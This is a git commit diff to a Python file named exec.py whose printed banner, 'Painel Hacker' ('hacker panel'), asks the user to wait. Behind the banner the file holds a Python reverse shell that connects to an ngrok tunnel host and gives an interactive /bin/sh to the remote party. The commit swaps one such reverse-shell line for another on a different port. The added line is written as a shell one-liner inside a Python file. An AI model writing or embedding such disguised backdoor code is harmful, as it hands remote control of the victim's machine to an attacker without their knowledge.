e1d5279358e870e8a526d4596a93330bac3dcb6c
nonamebrokk <105758898+nonamebrokk@users.noreply.github.com>
2022-10-16 11:52:43 -0400

    Update exec.py

--- exec.py
+++ exec.py
@@ -2,7 +2,6 @@ print('''
  == Painel Hacker ==
 
  [Aguarde, pode ser demorado...]
-
 ''')
 
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",12329));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",16737));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
